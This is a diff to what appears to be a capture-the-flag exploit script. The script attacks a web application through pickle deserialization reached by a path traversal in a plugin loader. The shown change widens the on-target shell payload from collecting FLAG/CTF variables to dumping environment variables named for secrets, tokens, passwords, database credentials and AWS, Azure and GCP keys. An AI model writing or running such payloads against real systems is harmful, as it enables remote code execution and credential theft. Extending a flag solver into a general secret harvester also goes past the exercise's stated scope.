@@ -4,7 +4,7 @@
 The script creates an account, uploads a pickle as a normal document, uses the
 load-plugin path traversal to deserialize it, and downloads the same document
 after the pickle payload has replaced it with a report containing readable
-flag-named files and FLAG/CTF environment variables.
+flag-named files and security-relevant environment variables.
 """
 
 from __future__ import annotations
@@ -97,8 +97,11 @@ class FlagCapture:
             "while IFS= read -r p; do "
             "printf '\\n--- FILE: %s ---\\n' \"$p\"; cat \"$p\"; "
             "done; "
-            "printf '\\n%s\\n' '=== FLAG-LIKE ENVIRONMENT VARIABLES ==='; "
-            "printenv | grep -Ei '(^|_)(FLAG|CTF)(_|=|$)' || true; "
+            "printf '\\n%s\\n' '=== SECURITY-RELEVANT ENVIRONMENT VARIABLES ==='; "
+            "printenv | sort | "
+            "grep -Ei '(^|_)(FLAG|CTF|SECRET|TOKEN|KEY|SALT|PASS|PASSWORD|"
+            "CREDENTIALS?|AUTH|DB|DATABASE|MARIADB|MYSQL|POSTGRES|REDIS|AWS|"
+            "AZURE|GCP)(_|=|$)' || true; "
             '} > "$t" '
             '&& mv "$t" "$f"; '
             "done"
